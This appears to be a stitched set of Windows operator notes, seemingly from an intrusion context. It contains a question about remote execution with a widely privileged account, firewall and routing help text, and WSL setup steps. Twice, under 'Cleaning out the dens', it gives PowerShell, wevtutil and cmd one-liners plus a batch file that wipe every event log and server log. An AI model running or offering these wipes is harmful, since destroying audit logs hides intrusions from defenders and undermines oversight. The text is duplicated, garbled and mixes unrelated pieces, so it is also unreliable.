1st There is an account YES which normally goes everywhere. When you try to remotely execute commands under this account (I tried psexec and wmic), it gives out "access denied" but by going to the rdp and starting the same batch file, for example, everything starts up fine.

2nd There is a session from this user on one of the hosts where everything works fine when connecting to other hosts via rdp (tried 5-7 hosts) and closing the rdp session window, the account is logged out. Roughly speaking, I cannot start the process and close the rdp window , the process will only run when the rdp session is active.
Despite the fact that on one host, as I indicated above, this is not observed.
What could it be? Tricky GPO settings? Why can I execute commands via RDP, but I can’t use remote tools,
On one host, the account works fine and when closing the rdp window, the processes work, but on other hosts a "logout" occurs
 
PS Maybe some glitch? I couldn’t randomly choose from 100+ hosts at the beginning exactly the one on which everything works well

Cleaning out the dens

1 Start a PowerShell console as an administrator and use the following command to list all classic event logs on your system, with their maximum sizes and the number of events in them.

Get-EventLog –LogName*


2 To clear all event logs, you would need to redirect the log names to the pipeline, however, unfortunately this is not allowed. Therefore, we will have to use the ForEach loop:

Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }


3 For working with events in Windows, a powerful command-line utility WevtUtil.exe has been available for quite some time.

To display a list of event logs registered in the system, run the command:

WevtUtil enum-logs

Clearing events in a specific log is done like this:

WevtUtil cl Setup

Before cleaning, you can back up the events in the log by saving them to a file:

WevtUtil cl Setup /bu:SetupLog_Bak.evtx

To clear all logs at once, you can use the Powershell Get-WinEvent cmdlet to get all log objects and Wevtutil.exe to clear them:

Get-WinEvent -ListLog * -Force | % { Wevtutil.exe cl $_.LogName }

or so

Wevtutil el | ForEach { wevtutil cl "$_"}


4 Clearing logs can also be done from the classic command line:

for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"


Batch file for cleaning logs

PHP:
 
break>"%CD%\server_log.txt"

break>"%CD%\logs\errors.log"
break>"%CD%\logs\log-core.log"
break>"%CD%\logs\warnings.log"
break>"%CD%\logs\plugins\mysql.log"


Clear all Windows Event Viewer logs
1.CMD
for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"

2. PowerShell
Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
```

Remarks:

- Add a new inbound or outbound rule to the firewall policy.
- Rule name should be unique and cannot be "all".
- If a remote computer or user group is specified, security must be
authenticate, authenc, authdynenc, or authnoencap.
- Setting security to authdynenc allows systems to dynamically
negotiate the use of encryption for traffic that matches
a given Windows Firewall rule. Encryption is negotiated based on
existing connection security rule properties. This option
enables the ability of a machine to accept the first TCP
or UDP packet of an inbound IPsec connection as long as
it is secured, but not encrypted, using IPsec.
Once the first packet is processed, the server will
re-negotiate the connection and upgrade it so that
all subsequent communications are fully encrypted.
- If action=bypass, the remote computer group must be specified when dir=i
n.
- If service=any, the rule applies only to services.
- ICMP type or code can be "any".
- Edge can only be specified for inbound rules.
- AuthEnc and authnoencap cannot be used together.
- Authdynenc is valid only when dir=in.
- When authnoencap is set, the security=authenticate option becomes an
optional parameter.

Examples:

Add an inbound rule with no encapsulation security for browser.exe:
netsh advfirewall firewall add rule name="allow browser"
dir=inprogram="c:\programfiles\browser\browser.exe"
security=authnoencap action=allow

Add an outbound rule for port 80:
netsh advfirewall firewall add rule name="allow80"
protocol=TCP dir=out localport=80 action=block

Add an inbound rule requiring security and encryption
for TCP port 80 traffic:
netsh advfirewall firewall add rule
name="Require Encryption for Inbound TCP/80"
protocol=TCP dir=in localport=80 security=authdynenc
action=allow

Add an inbound rule for browser.exe and require security
netsh advfirewall firewall add rule name="allow browser"
dir=inprogram="c:\program files\browser\browser.exe"
security=authenticate action=allow

Add an authenticated firewall bypass rule for group
acmedomain\scanners identified by a SDDL string:
netsh advfirewall firewall add rule name="allow scanners"
dir=in rmtcomputergrp=<SDDL string> action=bypass
security=authenticate

Add an outbound allow rule for local ports 5000-5010 for udp-
Add rule name="Allow port range" dir=out protocol=udp localport=5000-5010

Cleaning out the dens

1 Start a PowerShell console as an administrator and use the following command to list all classic event logs on your system, with their maximum sizes and the number of events in them.

Get-EventLog –LogName*


2 To clear all event logs, you would need to redirect the log names to the pipeline, however, unfortunately this is not allowed. Therefore, we will have to use the ForEach loop:

Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }


3 WevtUtil.exe, a powerful command-line utility, has been available for quite some time to work with events in Windows.

To display a list of event logs registered in the system, run the command:

WevtUtil enum-logs

Clearing events in a specific log is done like this:

WevtUtil cl Setup

Before cleaning, you can back up the events in the log by saving them to a file:

WevtUtil cl Setup /bu:SetupLog_Bak.evtx

To clear all logs at once, you can use the Powershell Get-WinEvent cmdlet to get all log objects and Wevtutil.exe to clear them:

Get-WinEvent -ListLog * -Force | % { Wevtutil.exe cl $_.LogName }

or so

Wevtutil el | ForEach { wevtutil cl "$_"}


4 Clearing logs can also be done from the classic command line:

for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"


Batch file for cleaning logs

PHP:
 
break>"%CD%\server_log.txt"

break>"%CD%\logs\errors.log"
break>"%CD%\logs\log-core.log"
break>"%CD%\logs\warnings.log"
break>"%CD%\logs\plugins\mysql.log"


Clear all Windows Event Viewer logs
1.CMD
for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"

2. PowerShell
Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
```

C:\Users\Administrator>route /print

Manipulate network routing tables.

ROUTE [-f] [-p] [-4|-6] command [destination]
[MASK netmask] [gateway] [METRIC metric] [IF interface]

-f Clears the routing tables of all gateway entries. If this is
used in conjunction with one of the commands, the tables are
cleared prior to running the command.

-p When used with the ADD command, makes a route persistent across
boots of the system. By default, routes are not preserved
when the system is restarted. Ignored for all other commands,
which always affect the appropriate persistent routes.

-4 Force using IPv4.

-6 Force using IPv6.

command One of these:
PRINT Prints a route
ADD Adds a route
DELETE Deletes a route
CHANGE Modifies an existing route
destination Specifies the host.
MASK Specifies that the next parameter is the 'netmask' value.
netmask Specifies a subnet mask value for this route entry.
If not specified, it defaults to 255.255.255.255.
gateway Specifies gateway.
interface the interface number for the specified route.
METRIC specifies the metric, ie. cost for the destination.

All symbolic names used for destination are looked up in the network database
file NETWORKS. The symbolic names for gateway are looked up in the host name
database file HOSTS.

If the command is PRINT or DELETE. Destination or gateway can be a wildcard,
(wildcard is specified as a star '*'), or the gateway argument may be omitted.

If Dest contains a * or ?, it is treated as a shell pattern, and only
matching destination routes are printed. The '*' matches any string,
and '?' matches any one char. Examples: 157.*.1, 157.*, 127.*, *224*.

Pattern match is only allowed in PRINT command.
Diagnostic Notes:
Invalid MASK generates an error, that is when (DEST & MASK) != DEST.
Example> route ADD 157.0.0.0 MASK 155.0.0.0 157.55.80.1 IF 1
The route addition failed: The specified mask parameter is invalid.
(Destination & Mask) != Destination.

Examples:

> route PRINT
> route PRINT -4
> route PRINT -6
> route PRINT 157* .... Only prints those matching 157*

> route ADD 157.0.0.0 MASK 255.0.0.0 157.55.80.1 METRIC 3 IF 2
destination^ ^mask ^gateway metric^ ^
Interface^
If IF is not given, it tries to find the best interface for a given
gateway.
> route ADD 3ffe::/32 3ffe::1

> route CHANGE 157.0.0.0 MASK 255.0.0.0 157.55.80.5 METRIC 2 IF 2

CHANGE is used to modify gateway and/or metric only.

> route DELETE 157.0.0.0
> route DELETE 3ffe::/32

we need windows server 2019+
1. run poower shell as administrator and type:
	> Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux

2. Download linux subsystem distro from: https://docs.microsoft.com/en-us/windows/wsl/install-manual
like:

	ubuntu18.04: https://aka.ms/wsl-ubuntu-1804
	ubuntu20.04: https://aka.ms/wslubuntu2004
	debian: https://aka.ms/wsl-debian-gnulinux

3. Open poowershell and extract files from appx like:(Ubuntu -> changed_name)
copy .appx downloaded file to C:\Users\Administrator and go to the this folder in pwsh

	> Rename-Item .\Ubuntu.appx .\Ubuntu.zip
> Expand-Archive .\Ubuntu.zip .\Ubuntu
> cd kali

4. Run Ubuntu.exe

5. Add your distro path to the Windows environment PATH (C:\Users\Administrator\Ubuntu in this example), using PowerShell:

$userenv = [System.Environment]::GetEnvironmentVariable("Path", "User")
[System.Environment]::SetEnvironmentVariable("PATH", $userenv + ";C:\Users\Administrator\Ubuntu", "User")



!1/ if you dont have exe in your folder, check this steps with another distro
!2/ Installation failed with error 0x8007007e: If you receive this error, then your system doesn't support WSL. Ensure that you're running Windows build 16215 or later. Check your build. Also check to confirm that WSL is enabled and your computer was restarted after the feature was enabled.
